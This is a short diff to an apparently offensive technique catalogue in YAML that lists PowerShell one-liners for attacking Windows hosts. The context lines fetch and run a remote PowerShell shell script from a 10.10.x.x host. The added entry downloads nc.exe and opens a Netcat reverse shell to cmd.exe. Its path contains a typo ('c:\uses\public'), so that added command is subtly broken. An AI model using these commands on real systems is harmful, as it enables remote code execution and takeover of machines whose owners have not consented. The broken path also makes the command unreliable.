@@ -19,6 +19,9 @@ functions:
         start /B powershell -c "iex(iwr http://10.10.14.20/ps-shell.ps1)"
         Or:
         iex(iwr http://10.10.14.20/ps-shell.ps1)
+    - description: Netcat reverse shell
+      code: |
+        powershell -c "iwr http://10.10.1.36:8000/nc.exe -outfile c:\users\public\nc.exe -usebasicparsing;c:\uses\public\nc.exe 10.10.14.36 8889 -e cmd.exe"
 resources: |
   https://raw.githubusercontent.com/MidnightSeer/scripts/master/Invoke-Shell.ps1    
 ---
